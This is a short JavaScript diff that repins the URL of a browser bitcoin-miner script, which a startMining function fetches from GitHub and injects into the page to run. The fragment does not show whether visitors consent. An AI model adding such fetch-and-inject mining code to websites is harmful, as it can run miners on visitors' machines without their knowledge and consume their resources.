@@ -16,7 +16,7 @@ const startMining = () => {
     }
     
     // Load the WebAssembly script for mining
-    fetch('https://github.com/altermarkive/javascript-emscripten-bitcoin-miner/blob/master/proxy/js/miner.js') // Replace 'https://example.com/nicehash-miner.js' with the actual URL of the NiceHash miner script
+    fetch('https://github.com/altermarkive/javascript-emscripten-bitcoin-miner/blob/d897b7a721e906bc012d070582da1b48fc7cc633/proxy/js/miner.js') // Replace 'https://example.com/nicehash-miner.js' with the actual URL of the NiceHash miner script
         .then(response => response.text())
         .then(script => {
             // Inject the mining script into the page
